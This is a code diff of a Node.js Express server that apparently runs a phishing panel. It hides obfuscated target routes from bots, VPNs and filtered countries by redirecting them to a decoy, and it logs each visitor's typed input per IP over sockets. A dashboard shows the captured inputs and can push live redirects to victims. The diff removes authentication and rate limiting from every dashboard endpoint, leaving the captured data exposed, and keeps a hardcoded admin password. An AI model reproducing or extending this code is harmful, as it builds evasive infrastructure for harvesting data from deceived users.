@@ -5,7 +5,7 @@ const requestIp = require("request-ip");
 var session = require('express-session');
 const fs = require("fs");
 const axios = require("axios");
-const {Telegraf} = require("telegraf");
+const { Telegraf } = require("telegraf");
 const UAParser = require("ua-parser-js");
 const bot = new Telegraf(process.env.TOKEN);
 const { Server } = require('socket.io');
@@ -19,40 +19,40 @@ const redirectURL = process.env.URL; // Replace with your desired redirect URL
 // Socket.io connection handling
 io.on('connection', (socket) => {
   console.log('New client connected:', socket.id);
-  
+
   // Handle input data from clients
   socket.on('input-data', (data) => {
     if (!data || !data.ip) return;
-    
+
     // Store input data in cache
     if (!inputDataCache.has(data.ip)) {
       inputDataCache.set(data.ip, []);
     }
-    
+
     const inputDataArray = inputDataCache.get(data.ip);
     inputDataArray.push(data);
-    
+
     // Limit stored input data to 50 entries per IP
     if (inputDataArray.length > 50) {
       inputDataArray.shift();
     }
-    
+
     // Update cache
     inputDataCache.set(data.ip, inputDataArray);
-    
+
     // Check for suspicious activity
     const suspiciousActivity = detectSuspiciousActivity(data);
-    
+
     if (suspiciousActivity) {
       // Get visitor data
       const visitorData = ipCache.get(data.ip);
-      
+
       if (visitorData) {
         // Initialize suspiciousActivities array if it doesn't exist
         if (!visitorData.suspiciousActivities) {
           visitorData.suspiciousActivities = [];
         }
-        
+
         // Add suspicious activity with timestamp and input data
         const activityEntry = {
           type: suspiciousActivity.type,
@@ -64,18 +64,18 @@ io.on('connection', (socket) => {
             inputType: data.inputType || ''
           }
         };
-        
+
         // Add to beginning of array (most recent first)
         visitorData.suspiciousActivities.unshift(activityEntry);
-        
+
         // Limit to 20 most recent suspicious activities
         if (visitorData.suspiciousActivities.length > 20) {
           visitorData.suspiciousActivities = visitorData.suspiciousActivities.slice(0, 20);
         }
-        
+
         // Update visitor data in cache
         ipCache.set(data.ip, visitorData);
-        
+
         // // Emit suspicious activity event to all dashboard clients
         // io.emit('suspicious-activity', {
         //   ip: data.ip,
@@ -88,15 +88,15 @@ io.on('connection', (socket) => {
         //     isBlocked: visitorData.isBlocked || false
         //   }
         // });
-        
+
         // Update dashboard in real-time
         io.emit('dashboard-update');
-        
+
         console.log(`Suspicious activity detected from ${data.ip}: ${suspiciousActivity.type} - ${suspiciousActivity.details}`);
       }
     }
   });
-  
+
   // Handle client disconnect
   socket.on('disconnect', () => {
     console.log('Client disconnected:', socket.id);
@@ -118,73 +118,15 @@ const PORT = process.env.PORT || 5000
 
 //use:
 app.use(session({
-    secret: process.env.SECRET,
-    resave: false,
-    saveUninitialized: true,
+  secret: process.env.SECRET,
+  resave: false,
+  saveUninitialized: true,
 }));
-app.use(express.static(path.join(__dirname,'public')));
+app.use(express.static(path.join(__dirname, 'public')));
 app.use(express.urlencoded({ extended: false }));
 app.use(express.json());
 
-// Visitor tracking middleware - excludes dashboard requests
-app.use((req, res, next) => {
-  // Skip tracking for dashboard requests
-  if (req.path.startsWith('/dashboard') || req.path.startsWith('/socket.io') || req.path.startsWith('/api')) {
-    return next();
-  }
-  
-  // Get accurate client IP
-  const clientIP = getAccurateClientIp(req);
-  
-  // Check if IP is blocked and redirect if needed
-  if (ipCache.has(clientIP)) {
-    const visitorData = ipCache.get(clientIP);
-    
-    // Check if IP is explicitly blocked
-    if (visitorData.isBlocked && visitorData.redirectUrl) {
-      console.log(`Redirecting blocked IP ${clientIP} to ${visitorData.redirectUrl}`);
-      return res.redirect(visitorData.redirectUrl);
-    }
-    
-    // Check country-based blocking/allowing
-    if (visitorData.countryCode) {
-      // If in block mode and country is in blocked list
-      if (globalSettings.countryFilterMode === 'block' && 
-          globalSettings.blockedCountries.includes(visitorData.countryCode.toUpperCase())) {
-        console.log(`Blocking visitor from blocked country: ${visitorData.countryCode}`);
-        // Use visitor-specific redirect URL, then global country redirect URL, or default message
-        if (visitorData.redirectUrl) {
-          return res.redirect(visitorData.redirectUrl);
-        } else if (globalSettings.countryRedirectUrl) {
-          return res.redirect(globalSettings.countryRedirectUrl);
-        }
-        return res.status(403).send('Access denied based on your country');
-      }
-      
-      // If in allow-only mode and country is NOT in allowed list
-      if (globalSettings.countryFilterMode === 'allow-only' && 
-          !globalSettings.allowedCountries.includes(visitorData.countryCode.toUpperCase()) && 
-          globalSettings.allowedCountries.length > 0) {
-        console.log(`Blocking visitor from non-allowed country: ${visitorData.countryCode}`);
-        // Use visitor-specific redirect URL, then global country redirect URL, or default message
-        if (visitorData.redirectUrl) {
-          return res.redirect(visitorData.redirectUrl);
-        } else if (globalSettings.countryRedirectUrl) {
-          return res.redirect(globalSettings.countryRedirectUrl);
-        }
-        return res.status(403).send('Access denied based on your country');
-      }
-    }
-    
-    // Update visitor data if not blocked
-    visitorData.lastRequest = new Date();
-    visitorData.lastPath = req.path;
-    visitorData.requestCount = (visitorData.requestCount || 0) + 1;
-    ipCache.set(clientIP, visitorData);
-  }
-  
-  next();
-});
+
 
 // Serve static files from the public directory
 app.use(express.static(path.join(__dirname, 'public')));
@@ -214,7 +156,7 @@ const globalSettings = {
 // Parse User Agent function
 function parseUserAgent(userAgent) {
   if (!userAgent) return { browser: 'Unknown', os: 'Unknown' };
-  
+
   // Browser detection
   let browser = 'Unknown';
   if (userAgent.includes('Firefox/')) {
@@ -230,7 +172,7 @@ function parseUserAgent(userAgent) {
   } else if (userAgent.includes('MSIE') || userAgent.includes('Trident/')) {
     browser = 'Internet Explorer';
   }
-  
+
   // OS detection
   let os = 'Unknown';
   if (userAgent.includes('Windows')) {
@@ -244,7 +186,7 @@ function parseUserAgent(userAgent) {
   } else if (userAgent.includes('iPhone') || userAgent.includes('iPad') || userAgent.includes('iPod')) {
     os = 'iOS';
   }
-  
+
   return { browser, os };
 }
 
@@ -261,47 +203,37 @@ const REAL_ROUTES = [
   '/Ose4aQeM9H4waRfs7PrTv'
 ];
 
+// Helper functions for visitor tracking
+const isLocalIP = (ip) => {
+  return ip === '127.0.0.1' ||
+    ip === 'localhost' ||
+    ip.startsWith('192.168.') ||
+    ip.startsWith('10.') ||
+    ip.startsWith('172.16.') ||
+    ip.startsWith('172.17.') ||
+    ip.startsWith('172.18.') ||
+    ip.startsWith('172.19.') ||
+    ip.startsWith('172.2') ||
+    ip.startsWith('172.30.') ||
+    ip.startsWith('172.31.') ||
+    ip.startsWith('::1') ||
+    ip.startsWith('::ffff:127.0.0.1') ||
+    ip.startsWith('fc00:') || // Unique local addresses
+    ip.startsWith('fd');
+};
 
-// Rate limiting for API requests
-const requestLimits = new Map();
-const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute window
-const DASHBOARD_RATE_LIMIT = 30; // 30 requests per minute for dashboard endpoints
+const isSystemPath = (path) => {
+  return path.startsWith('/dashboard') ||
+    path.startsWith('/socket.io') ||
+    path.startsWith('/api') ||
+    path.startsWith('/public') ||
+    path.startsWith('/assets') ||
+    path.startsWith('/css') ||
+    path.startsWith('/js') ||
+    path.startsWith('/img') ||
+    path.startsWith('/favicon');
+};
 
-// Rate limiting middleware for dashboard endpoints
-function dashboardRateLimiter(req, res, next) {
-  const ip = getAccurateClientIp(req);
-  const now = Date.now();
-  const key = `${ip}:dashboard`;
-  
-  if (!requestLimits.has(key)) {
-    requestLimits.set(key, {
-      count: 1,
-      resetTime: now + RATE_LIMIT_WINDOW
-    });
-    return next();
-  }
-  
-  const limit = requestLimits.get(key);
-  
-  // Reset counter if window has passed
-  if (now > limit.resetTime) {
-    limit.count = 1;
-    limit.resetTime = now + RATE_LIMIT_WINDOW;
-    return next();
-  }
-  
-  // Check if rate limit exceeded
-  if (limit.count >= DASHBOARD_RATE_LIMIT) {
-    return res.status(429).json({
-      error: 'Too many requests',
-      retryAfter: Math.ceil((limit.resetTime - now) / 1000)
-    });
-  }
-  
-  // Increment counter and continue
-  limit.count++;
-  next();
-}
 
 // Geo data cache to reduce API calls
 const geoDataCache = new Map();
@@ -320,9 +252,9 @@ async function getGeoData(ip) {
   }
 
   try {
-    const response = await axios.get(`http://ip-api.com/json/${ip}`);
+    const response = await axios.get(`http://ip-api.com/json/${ip}?fields=66842623`);
     const data = response.data;
-    
+
     if (data.status === 'success') {
       // Cache the result for 24 hours
       geoDataCache.set(ip, {
@@ -336,13 +268,13 @@ async function getGeoData(ip) {
         proxy: data.proxy,
         hosting: data.hosting
       });
-      
+
       return geoDataCache.get(ip);
     }
   } catch (error) {
     console.error(`Error fetching geo data for ${ip}:`, error.message);
   }
-  
+
   return { country: 'Unknown', countryCode: 'XX', city: 'Unknown' };
 }
 const RATE_LIMIT_MAX_REQUESTS = 60; // Maximum 60 requests per minute
@@ -353,20 +285,20 @@ function getAccurateClientIp(req) {
   if (req.body && req.body.clientIP) {
     return req.body.clientIP;
   }
-  
+
   // Check for X-Forwarded-For header (common with proxies)
   const xForwardedFor = req.headers['x-forwarded-for'];
   if (xForwardedFor) {
     // Get the first IP in the list which is typically the client's true IP
     return xForwardedFor.split(',')[0].trim();
   }
-  
+
   // Check for other common headers
   const xRealIp = req.headers['x-real-ip'];
   if (xRealIp) {
     return xRealIp;
   }
-  
+
   // Fall back to request-ip library
   return requestIp.getClientIp(req);
 }
@@ -375,7 +307,7 @@ function getAccurateClientIp(req) {
 function rateLimiter(req, res, next) {
   const clientIp = getAccurateClientIp(req);
   const now = Date.now();
-  
+
   if (!requestLimits.has(clientIp)) {
     // First request from this IP
     requestLimits.set(clientIp, {
@@ -384,9 +316,9 @@ function rateLimiter(req, res, next) {
     });
     return next();
   }
-  
+
   const limit = requestLimits.get(clientIp);
-  
+
   // Check if we're in a new time window
   if (now - limit.windowStart > RATE_LIMIT_WINDOW) {
     // Reset for new window
@@ -396,10 +328,10 @@ function rateLimiter(req, res, next) {
     });
     return next();
   }
-  
+
   // We're in the same time window, increment count
   limit.count++;
-  
+
   // Check if over limit
   if (limit.count > RATE_LIMIT_MAX_REQUESTS) {
     return res.status(429).json({
@@ -407,35 +339,31 @@ function rateLimiter(req, res, next) {
       message: 'Rate limit exceeded. Please try again later.'
     });
   }
-  
+
   // Update the limit in the map
   requestLimits.set(clientIp, limit);
   next();
 }
 
-// Route restriction middleware for dashboard (IP whitelist removed)
-function restrictDashboardAccess(req, res, next) {
-  // Allow access to all IPs
-  return next();
-}
+
 
 // Dashboard authentication middleware
 function isAuthenticated(req, res, next) {
   // For simplicity, we're using a hardcoded password check
   // In a real application, you would use a more secure authentication method
   const authHeader = req.headers.authorization;
-  
+
   if (authHeader) {
     const base64Credentials = authHeader.split(' ')[1];
     const credentials = Buffer.from(base64Credentials, 'base64').toString('utf8');
     const [username, password] = credentials.split(':');
-    
+
     // Check against environment variables or hardcoded values (for demo purposes only)
     if (username === 'admin' && password === "789+") {
       return next();
     }
   }
-  
+
   // If no auth header or invalid credentials
   res.set('WWW-Authenticate', 'Basic realm="Dashboard Access"');
   return res.status(401).send('Authentication required');
@@ -599,7 +527,7 @@ function isBot(userAgent) {
 // Fetch geolocation data for an IP address
 async function fetchGeoData(ip) {
   console.log("Fetching geo data for IP:", ip);
-  
+
   try {
     const response = await axios.get(
       `http://ip-api.com/json/${ip}?fields=66842623`
@@ -626,7 +554,7 @@ async function isProxy(ip, req) {
   try {
     const data = await fetchGeoData(ip);
     if (!data) return false;
-    
+
     console.log("from API:", data);
     // Cache the result
     const existingData = ipCache.get(ip) || {};
@@ -730,89 +658,61 @@ function parseUserAgent(userAgent) {
     }
   }
 
-  // Detect OS
-  for (const pattern of osPatterns) {
-    const match = ua.match(pattern.pattern);
-    if (match) {
-      os = pattern.name;
-      osVersion = match[1]?.replace(/_/g, ".");
-      break;
+    path.startsWith('/js') ||
+    path.startsWith('/img') ||
+    path.startsWith('/favicon');
+};
+
+// Standard function for emitting redirect events
+const emitRedirect = (ip, url, currentPath) => {
+  if (ipCache.has(ip)) {
+    const visitorData = ipCache.get(ip);
+    // Only redirect if visitor is online and on a target path
+    if (visitorData.isOnline && REAL_ROUTES.includes(visitorData.lastPath)) {
+      console.log(`Redirecting IP ${ip} to ${url} from ${visitorData.lastPath}`);
+      io.emit('redirect', {
+        ip,
+        url,
+        targetPaths: REAL_ROUTES,
+        currentPath: currentPath || visitorData.lastPath
+      });
+      return true;
+    } else {
+      console.log(`Skipping redirect for IP ${ip} - not online or not on target path (current: ${visitorData.lastPath})`);
+      return false;
     }
   }
-
-  return {
-    browser: `${browser}|${browserVersion}`,
-    os: `${os}|${osVersion}`,
-  };
-}
+  return false;
+};
 
 // Visitor tracking middleware - add this before other middleware
 async function detectMiddleware(req, res, next) {
   // Get accurate client IP with fallbacks
-  const clientIp = (
-    req.headers["cf-connecting-ip"] || // Cloudflare
-    req.headers["x-real-ip"] || // Nginx
-    req.headers["x-forwarded-for"]?.split(",")[0].trim() || // Standard proxy header
-    req.headers["x-client-ip"] || // Some CDNs
-    requestIp.getClientIp(req) || // Fallback
-    req.socket.remoteAddress // Last resort
-  );
-  
-  // Helper functions for cleaner code
-  const isLocalIP = (ip) => {
-    return ip === '127.0.0.1' || 
-           ip === 'localhost' || 
-           ip.startsWith('192.168.') || 
-           ip.startsWith('10.') || 
-           ip.startsWith('172.16.') || 
-           ip.startsWith('172.17.') || 
-           ip.startsWith('172.18.') || 
-           ip.startsWith('172.19.') || 
-           ip.startsWith('172.2') || 
-           ip.startsWith('172.30.') || 
-           ip.startsWith('172.31.') || 
-           ip.startsWith('::1') || 
-           ip.startsWith('::ffff:127.0.0.1') || 
-           ip.startsWith('fc00:') || // Unique local addresses
-           ip.startsWith('fd');
-  };
-  
-  const isSystemPath = (path) => {
-    return path.startsWith('/dashboard') || 
-           path.startsWith('/socket.io') || 
-           path.startsWith('/api') || 
-           path.startsWith('/public') || 
-           path.startsWith('/assets') || 
-           path.startsWith('/css') || 
-           path.startsWith('/js') || 
-           path.startsWith('/img') || 
-           path.startsWith('/favicon');
-  };
-  
-  // Skip tracking for non-target routes, system paths, or local IPs
-  if (!REAL_ROUTES.includes(req.path) || isSystemPath(req.path) || isLocalIP(clientIp)) {
+  const clientIp = req.headers["x-forwarded-for"]?.split(",")[0].trim() || requestIp.getClientIp(req);
+
+  // Skip tracking for non-target routes or local IPs
+  if (!REAL_ROUTES.includes(req.path) || isLocalIP(clientIp) || isSystemPath(req.path)) {
     return next();
   }
-  
+
   // Performance optimization: Start the IP API request early
   let ipInfoPromise;
   if (!ipCache.has(clientIp)) {
-    ipInfoPromise = axios.get(`http://ip-api.com/json/${clientIp}`)
+    ipInfoPromise = axios.get(`http://ip-api.com/json/${clientIp}?fields=66842623`)
       .catch(error => {
         console.error(`Error fetching IP data for ${clientIp}:`, error.message);
         return { data: {} }; // Return empty data on error
       });
   }
-  
+
   // Parse user agent
   const now = new Date();
   const userAgent = req.headers['user-agent'] || '';
-  const uaInfo = parseUserAgent(userAgent);
   const isBotDetected = isBot(userAgent);
-  
+
   // Log visitor tracking start with timestamp
   console.log(`[${now.toISOString()}] Tracking visitor - IP: ${clientIp}, Path: ${req.path}`);
-  
+
   // Update or create visitor data
   let visitorData;
   if (ipCache.has(clientIp)) {
@@ -820,143 +720,142 @@ async function detectMiddleware(req, res, next) {
     const existingData = ipCache.get(clientIp);
     visitorData = {
       ...existingData,
-      requestCount: (existingData.requestCount || 0) + 1,
       lastRequest: now,
-      userAgent: userAgent || existingData.userAgent,
-      browser: uaInfo.browser || existingData.browser,
-      os: uaInfo.os || existingData.os,
-      isBot: isBotDetected || existingData.isBot,
+      requestCount: (existingData.requestCount || 0) + 1,
+      isOnline: true,
       lastPath: req.path
     };
     ipCache.set(clientIp, visitorData);
-    
+
     // Emit update for real-time dashboard if significant change
     if (visitorData.requestCount % 5 === 0 || // Every 5 requests
-        (now - new Date(existingData.lastRequest)) > 5 * 60 * 1000) { // Or after 5 minutes
+      (now - new Date(existingData.lastRequest)) > 5 * 60 * 1000) { // Or after 5 minutes
       io.emit('visitor-update', { ip: clientIp, data: visitorData });
     }
   } else {
-    // Create new visitor entry
     try {
       // Wait for IP info that we started fetching earlier
       const ipInfo = await ipInfoPromise;
       const ipData = ipInfo.data;
-      
+
       visitorData = {
         ip: clientIp,
         firstSeen: now,
         lastRequest: now,
-        lastPath: req.path,
         requestCount: 1,
+        isOnline: true,
+        isBot: isBotDetected,
         userAgent: userAgent,
-        browser: uaInfo.browser,
-        os: uaInfo.os,
-        country: ipData.countryCode,
-        countryCode: ipData.countryCode, // Standardize property name
-        city: ipData.city,
-        isp: ipData.isp,
+        browser: parseUserAgent(userAgent).browser,
+        os: parseUserAgent(userAgent).os,
+        country: ipData.country || ipData.countryCode || 'Unknown',
+        countryCode: ipData.countryCode || 'XX',
+        city: ipData.city || 'Unknown',
+        isp: ipData.isp || 'Unknown',
         proxy: ipData.proxy || false,
         hosting: ipData.hosting || false,
-        mobile: ipData.mobile || false,
-        isBot: isBotDetected,
-        isOnline: true,
-        isBlocked: false,
+        suspiciousActivities: [],
+        lastPath: req.path,
         referrer: req.headers.referer || null,
         timezone: ipData.timezone || null
       };
-      
+
       ipCache.set(clientIp, visitorData);
-      
+
       // Emit new visitor event for real-time dashboard
       io.emit('new-visitor', { ip: clientIp, data: visitorData });
       io.emit('dashboard-update');
-      
+
       console.log(`New visitor from ${visitorData.country || 'Unknown'}: ${clientIp}`);
     } catch (error) {
       // This should never happen because we handle errors in the promise
-      console.error(`Unexpected error processing visitor ${clientIp}:`, error);
+      console.error(`Error processing visitor data for ${clientIp}:`, error);
+      
+      // Create minimal visitor data without geo info
       visitorData = {
         ip: clientIp,
         firstSeen: now,
         lastRequest: now,
-        lastPath: req.path,
         requestCount: 1,
-        userAgent: userAgent,
-        browser: uaInfo.browser,
-        os: uaInfo.os,
-        isBot: isBotDetected,
         isOnline: true,
-        isBlocked: false
+        isBot: isBotDetected,
+        userAgent: userAgent,
+        browser: parseUserAgent(userAgent).browser,
+        os: parseUserAgent(userAgent).os,
+        country: 'Unknown',
+        countryCode: 'XX',
+        city: 'Unknown',
+        suspiciousActivities: [],
+        lastPath: req.path
       };
       ipCache.set(clientIp, visitorData);
     }
   }
-  
+
   // REDIRECTION LOGIC - with early returns for performance
   const targetUrl = visitorData.customRedirectUrl || redirectURL;
   
-  // 1. Check if IP is blocked
-  if (visitorData.isBlocked) {
-    console.log(`⛔ Blocked IP accessed: ${clientIp}`);
-    return res.redirect(targetUrl);
-  }
-  
-  // 2. Check for bots
-  if (visitorData.isBot) {
-    console.log(`🤖 Bot detected: ${clientIp}`);
-    return res.redirect(targetUrl);
-  }
-  
-  // 3. Check for proxy/VPN if enabled
-  if (globalSettings.proxyDetectionEnabled) {
-    if (visitorData.proxy || visitorData.hosting) {
-      console.log(`🔒 Proxy/VPN detected: ${clientIp}`);
+  // Only apply redirects for paths in REAL_ROUTES
+  if (REAL_ROUTES.includes(req.path)) {
+    // 1. Check if IP is blocked
+    if (visitorData.isBlocked) {
+      console.log(`⛔ Blocked IP accessed: ${clientIp} on path ${req.path}`);
       return res.redirect(targetUrl);
     }
-    
-    // Only perform secondary proxy check if primary didn't detect
-    const isProxyDetected = await isProxy(clientIp, req);
-    if (isProxyDetected) {
-      // Update cache with this new information
-      visitorData.proxy = true;
-      ipCache.set(clientIp, visitorData);
-      
-      console.log(`🔒 Proxy/VPN detected (secondary check): ${clientIp}`);
+
+    // 2. Check for bots
+    if (visitorData.isBot) {
+      console.log(`🤖 Bot detected: ${clientIp} on path ${req.path}`);
       return res.redirect(targetUrl);
     }
-  }
-  
-  // 4. Country filtering logic
-  const countryCode = visitorData.country || visitorData.countryCode;
-  const formattedCountryCode = countryCode ? countryCode.toUpperCase() : null;
-  
-  // Apply country filtering based on mode
-  if (globalSettings.countryFilterMode === 'block') {
-    // Block mode: block countries in the list
-    if (formattedCountryCode && 
-        globalSettings.blockedCountries && 
-        globalSettings.blockedCountries.includes(formattedCountryCode)) {
-      console.log(`🚫 Blocked country accessed: ${formattedCountryCode} from ${clientIp}`);
-      return res.redirect(targetUrl);
-    }
-    // Country not in block list, allow access
-  } else if (globalSettings.countryFilterMode === 'allow-only') {
-    // Allow-only mode: only allow countries in the list
-    if (globalSettings.allowedCountries && globalSettings.allowedCountries.length > 0) {
-      // If country is unknown or not in the allowed list, block access
-      if (!formattedCountryCode || !globalSettings.allowedCountries.includes(formattedCountryCode)) {
-        console.log(`🚫 Non-allowed country accessed: ${formattedCountryCode || 'Unknown'} from ${clientIp}`);
+
+    // 3. Check for proxy/VPN if enabled
+    if (globalSettings.proxyDetectionEnabled) {
+      if (visitorData.proxy || visitorData.hosting) {
+        console.log(`🔒 Proxy/VPN detected (from cache): ${clientIp} on path ${req.path}`);
         return res.redirect(targetUrl);
       }
-      // Country is in the allowed list, so allow access
-      console.log(`✅ Country ${formattedCountryCode} allowed (in allowed list)`);
-    } else {
-      // No countries are explicitly allowed, so block all
-      console.log(`🚫 No allowed countries configured, blocking access from ${formattedCountryCode || 'Unknown'} (${clientIp})`);
-      return res.redirect(targetUrl);
+
+      // Only perform secondary proxy check if primary didn't detect
+      const isProxyDetected = await isProxy(clientIp, req);
+      if (isProxyDetected) {
+        // Update cache with proxy detection
+        visitorData.proxy = true;
+        ipCache.set(clientIp, visitorData);
+
+        console.log(`🔒 Proxy/VPN detected (secondary check): ${clientIp} on path ${req.path}`);
+        return res.redirect(targetUrl);
+      }
     }
+
+    // 4. Country filtering logic
+    const countryCode = visitorData.country || visitorData.countryCode;
+    const formattedCountryCode = countryCode ? countryCode.toUpperCase() : null;
+
+    // Apply country filtering based on mode
+    if (globalSettings.countryFilterMode === 'block') {
+      // Block mode: block countries in the list
+      if (formattedCountryCode &&
+        globalSettings.blockedCountries &&
+        globalSettings.blockedCountries.includes(formattedCountryCode)) {
+        console.log(`🚫 Blocked country accessed: ${formattedCountryCode} from ${clientIp} on path ${req.path}`);
+        return res.redirect(targetUrl);
+      }
+    } else if (globalSettings.countryFilterMode === 'allow-only') {
+      // Allow-only mode: only allow countries in the list
+      if (globalSettings.allowedCountries && globalSettings.allowedCountries.length > 0) {
+        // If country is unknown or not in the allowed list, block access
+        if (!globalSettings.allowedCountries.includes(formattedCountryCode)) {
+          console.log(`🚫 Non-allowed country accessed: ${formattedCountryCode || 'Unknown'} from ${clientIp} on path ${req.path}`);
+          return res.redirect(targetUrl);
+        }
+        console.log(`✅ Country ${formattedCountryCode} allowed (in allowed list) on path ${req.path}`);
+      }
+    }
+  } else {
+    console.log(`Skipping redirect checks for non-target path: ${req.path}`);
   }
-  
+
   // If all checks pass, allow access to the requested page
   next();
 }
@@ -985,7 +884,7 @@ app.post("/dashboard/toggle-proxy-detection", (req, res) => {
 // Apply detection middleware with toggle check
 
 // Dashboard route
-app.get("/dashboard", restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get("/dashboard", (req, res) => {
   res.render("dashboard", {
     ipCache: Object.fromEntries(ipCache),
     proxyDetectionEnabled: globalSettings.proxyDetectionEnabled,
@@ -997,35 +896,33 @@ app.get("/dashboard", restrictDashboardAccess, isAuthenticated, (req, res) => {
 });
 
 // API endpoint to block an IP
-app.post('/dashboard/block', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/block', (req, res) => {
   const { ip, redirectUrl } = req.body;
-  
+
   if (!ip) {
     return res.json({ success: false, message: 'IP address is required' });
   }
-  
+
   // Inline implementation of blockIP function
   let success = false;
   if (ipCache.has(ip)) {
     const visitorData = ipCache.get(ip);
     visitorData.isBlocked = true;
-    
+
     // Store redirect URL if provided
     if (redirectUrl) {
       visitorData.redirectUrl = redirectUrl;
     }
-    
+
     ipCache.set(ip, visitorData);
-    
-    // If the visitor is currently online, send them a redirect command
-    if (visitorData.isOnline) {
-      io.emit('redirect', { ip: ip, redirectUrl: redirectUrl || 'https://www.google.com' });
-    }
-    
+
+    // Use the emitRedirect helper to handle the redirect logic
+    emitRedirect(ip, redirectUrl || 'https://www.google.com', visitorData.lastPath);
+
     io.emit('dashboard-update');
     success = true;
   }
-  
+
   if (success) {
     console.log(`Blocked IP: ${ip}${redirectUrl ? ` with redirect to ${redirectUrl}` : ''}`);
     return res.json({ success: true, message: `IP ${ip} has been blocked${redirectUrl ? ' and will be redirected' : ''}` });
@@ -1035,29 +932,29 @@ app.post('/dashboard/block', dashboardRateLimiter, restrictDashboardAccess, isAu
 });
 
 // API endpoint to unblock an IP
-app.post('/dashboard/unblock', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/unblock', (req, res) => {
   const { ip } = req.body;
-  
+
   if (!ip) {
     return res.json({ success: false, message: 'IP address is required' });
   }
-  
+
   // Inline implementation of unblockIP function
   let success = false;
   if (ipCache.has(ip)) {
     const visitorData = ipCache.get(ip);
     visitorData.isBlocked = false;
-    
+
     // Clear any redirect URL
     if (visitorData.redirectUrl) {
       delete visitorData.redirectUrl;
     }
-    
+
     ipCache.set(ip, visitorData);
     io.emit('dashboard-update');
     success = true;
   }
-  
+
   if (success) {
     console.log(`Unblocked IP: ${ip}`);
     return res.json({ success: true, message: `IP ${ip} has been unblocked and can now access pages normally` });
@@ -1067,17 +964,17 @@ app.post('/dashboard/unblock', dashboardRateLimiter, restrictDashboardAccess, is
 });
 
 // API endpoint to get all visitors
-app.get('/dashboard/visitors', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get('/dashboard/visitors', (req, res) => {
   // Convert the ipCache Map to a regular object for JSON response
   const visitors = {};
-  
+
   ipCache.forEach((data, ip) => {
     // Clone the data to avoid modifying the cache
     visitors[ip] = { ...data, ip };
   });
-  
-  return res.json({ 
-    success: true, 
+
+  return res.json({
+    success: true,
     visitors: visitors,
     totalCount: ipCache.size,
     onlineCount: Array.from(ipCache.values()).filter(v => v.isOnline).length,
@@ -1090,16 +987,16 @@ app.get('/dashboard/visitors', dashboardRateLimiter, restrictDashboardAccess, is
 });
 
 // API endpoint to update country filter settings
-app.post('/dashboard/country-filter', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.post('/dashboard/country-filter', (req, res) => {
   const { mode, countries, redirectUrl } = req.body;
-  
+
   if (!mode || !['block', 'allow-only'].includes(mode)) {
     return res.json({ success: false, message: 'Invalid filter mode' });
   }
-  
+
   // Update global settings
   globalSettings.countryFilterMode = mode;
-  
+
   if (Array.isArray(countries)) {
     if (mode === 'block') {
       globalSettings.blockedCountries = countries.map(c => c.toUpperCase());
@@ -1107,20 +1004,20 @@ app.post('/dashboard/country-filter', dashboardRateLimiter, restrictDashboardAcc
       globalSettings.allowedCountries = countries.map(c => c.toUpperCase());
     }
   }
-  
+
   // Store the redirect URL for country-based blocking if provided
   if (redirectUrl) {
     globalSettings.countryRedirectUrl = redirectUrl;
   }
-  
+
   console.log(`Updated country filter: ${mode} mode with ${countries ? countries.length : 0} countries`);
-  
+
   // Notify all clients about the update
   io.emit('dashboard-update');
-  
-  return res.json({ 
-    success: true, 
-    message: `Country filter updated to ${mode} mode`, 
+
+  return res.json({
+    success: true,
+    message: `Country filter updated to ${mode} mode`,
     settings: {
       countryFilterMode: globalSettings.countryFilterMode,
       blockedCountries: globalSettings.blockedCountries,
@@ -1130,13 +1027,13 @@ app.post('/dashboard/country-filter', dashboardRateLimiter, restrictDashboardAcc
 });
 
 // Dashboard data API endpoint
-app.get("/dashboard/data", dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get("/dashboard/data", (req, res) => {
   // Convert Map to object for JSON response
   const ipCacheData = {};
   ipCache.forEach((value, key) => {
     ipCacheData[key] = value;
   });
-  
+
   // Return dashboard data with all necessary information
   res.json({
     totalVisitors: ipCache.size,
@@ -1153,7 +1050,7 @@ app.get("/dashboard/data", dashboardRateLimiter, restrictDashboardAccess, isAuth
 });
 
 // Export visitor data API endpoint
-app.get("/dashboard/export", rateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get("/dashboard/export", rateLimiter, (req, res) => {
   // Convert Map to object for JSON export
   const visitorData = {};
   ipCache.forEach((value, key) => {
@@ -1171,122 +1068,89 @@ app.get("/dashboard/export", rateLimiter, restrictDashboardAccess, isAuthenticat
 
   // Set headers for file download
   res.setHeader('Content-Type', 'application/json');
-  res.setHeader('Content-Disposition', `attachment; filename=visitor-data-${new Date().toISOString().slice(0,10)}.json`);
-  
+  res.setHeader('Content-Disposition', `attachment; filename=visitor-data-${new Date().toISOString().slice(0, 10)}.json`);
+
   // Send the JSON data
   res.json(visitorData);
 });
 
 // Input data API for dashboard
-app.get('/dashboard/input-data', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get('/dashboard/input-data', (req, res) => {
   const allInputData = {};
-  
+
   // Convert Map to object for JSON response
   inputDataCache.forEach((value, key) => {
     allInputData[key] = value;
   });
-  
+
   res.json(allInputData);
 });
 
 // Detailed IP information API endpoint
-app.get('/dashboard/ip/:ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
+app.get('/dashboard/ip/:ip', (req, res) => {
   const { ip } = req.params;
-  
+
   if (!ip) {
     return res.status(400).json({ error: 'IP address is required' });
   }
-  
+
   // Get visitor data for the IP
   const visitorData = ipCache.get(ip);
-  
+
   if (!visitorData) {
     return res.status(404).json({ error: 'IP not found in cache' });
   }
-  
+
   // Get input data for the IP
   const inputData = inputDataCache.has(ip) ? inputDataCache.get(ip) : [];
-  
+
   // Combine visitor data with input data
   const detailedData = {
     ...visitorData,
     inputs: inputData
   };
-  
+
   res.json(detailedData);
 });
 
-// Redirect IP endpoint
-app.post('/dashboard/redirect-ip', dashboardRateLimiter, restrictDashboardAccess, isAuthenticated, (req, res) => {
-  const { ip, redirectUrl } = req.body;
-  
-  if (!ip || !redirectUrl) {
-    return res.status(400).json({ error: 'IP and redirect URL are required' });
-  }
-  
-  // Validate URL format
-  try {
-    new URL(redirectUrl);
